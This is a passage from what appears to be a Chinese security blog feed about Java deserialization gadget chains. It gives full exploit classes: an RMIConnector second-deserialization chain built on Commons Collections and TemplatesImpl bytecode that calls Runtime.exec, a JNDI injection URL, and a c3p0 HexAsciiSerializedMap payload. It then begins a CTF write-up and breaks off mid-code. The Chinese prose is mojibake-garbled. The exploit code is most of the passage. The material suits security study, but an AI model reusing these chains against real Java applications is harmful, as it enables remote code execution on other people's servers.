class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIConnectorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/stub/&quot;</span> + getCode()), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">invokeTransformer</span> <span class="hljs-operator">=</span> InvokerTransformer.getInstance(<span class="hljs-string">&quot;connect&quot;</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">constantTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, constantTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(entry, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">// å°†çœŸæ­£çš„transformersæ•°ç»„è®¾ç½®è¿›æ¥</span><br>        setValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokeTransformer);<br>        setValue(entry,<span class="hljs-string">&quot;key&quot;</span>, rmiConnector);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>findRMIServerJRMP</code>æ”¯æŒ<code>jndi</code>ã€<code>stub</code>ã€<code>iiop</code></p><p>è·Ÿè¿›<code>path</code>ä»¥<code>/jndi/</code>å¼€å¤´çš„åˆ†æ”¯ï¼š<code>findRMIServerJNDI</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJNDI</span><span class="hljs-params">(String jndiURL, Map&lt;String, ?&gt; env,</span><br><span class="hljs-params">                                    <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> NamingException &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(EnvHelp.mapToHashtable(env));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">objref</span> <span class="hljs-operator">=</span> ctx.lookup(jndiURL);<br>    ctx.close();<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„<code>InitialContext#lookup</code>ï¼Œæ”¹ä¸€ä¸‹<code>path</code>å°±å¯ä»¥<code>jndi</code>æ³¨å…¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/jndi/ldap://127.0.0.1:8099/aaa&quot;</span> )<br></code></pre></td></tr></table></figure><h2 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h2><p><code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setuserOverridesAsString</code>å¯ä»¥è·Ÿè¿›åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">C3P0ImplUtils#parseUserOverridesAsString<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">HASM_HEADER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">parseUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span>&#123; <br>    <span class="hljs-keyword">if</span> (userOverridesAsString != <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hexAscii</span> <span class="hljs-operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="hljs-number">1</span>, userOverridesAsString.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );<br>        <span class="hljs-keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> Collections.EMPTY_MAP;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œå­—ç¬¦æˆªå–æ˜¯ä»<code>HASM_HEADER.length() + 1</code>åˆ°<code>userOverridesAsString.length() - 1</code>ï¼Œæœ€åä¸€ä½ä¼šåƒæ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableUtils#fromByteArray<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">fromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123; <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> deserializeFromByteArray( bytes ); <br>    <span class="hljs-keyword">if</span> (out <span class="hljs-keyword">instanceof</span> IndirectlySerialized)<br>        <span class="hljs-keyword">return</span> ((IndirectlySerialized) out).getObject();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> out;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span>&#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>é…åˆ<code>fastjson</code>æˆ–<code>ROME</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.mchange.lang.ByteUtils;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getCC6Bytes() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;p4d0rn&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> ByteUtils.toHexAscii(getCC6Bytes());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&#x27;!&#x27;</span>;<br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">wrapperConnectionPoolDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>();<br>        wrapperConnectionPoolDataSource.setUserOverridesAsString(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ul><li><p><a href="https://www.anquanke.com/post/id/256986#h3-9">https://www.anquanke.com/post/id/256986#h3-9</a></p></li><li><p><a href="https://y4tacker.github.io/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/#hex%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8">c3p0çš„ä¸‰ä¸ªgadgetçš„å­¦ä¹  | Y4tackerâ€™s Blog</a></p></li><li><p><a href="https://p4d0rn.gitbook.io/java/others/desertwice#rmiconnector">Deserialization Twice | Java (gitbook.io)</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»å·…å³°æå®¢2023Baby_URLçœ‹äºŒæ¬¡ååºåˆ—åŒ–å’ŒJacksonåŸç”Ÿé“¾</title>
    <link href="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/"/>
    <url>/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æœ¬æ¥æ˜¯æƒ³å­¦ä¹ JacksonåŸç”Ÿé“¾æ‰å¼€å§‹åšè¿™é“é¢˜æ‰“å¤ç°ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°çš„æ˜¯è¿™é“é¢˜çš„ä¸¤ä¸ªåšæ³•è®©æˆ‘å­¦ä¹ åˆ°äº†JacksonåŸç”Ÿé“¾ç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•é»‘åå•æˆ–è€…æ‰“TemplatesImplæ¶æ„å­—èŠ‚ç ã€‚</p><p>å­¦åˆ°å¦‚ä»Šæ›´è§‰å—ç›ŠåŒªæµ…ï¼Œè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å®¡ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211530820.png" alt="image-20240803211530820"></p><p><strong>IndexController.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/hack&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String payload)</span> &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(byteArrayInputStream);<br>            <span class="hljs-type">URLHelper</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (URLHelper)ois.readObject();<br>            System.out.println(o);<br>            System.out.println(o.url);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok!&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/file&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">file</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            file.createNewFile();<br>        &#125;<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        fis.read(bytes);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLHelper.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLHelper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title 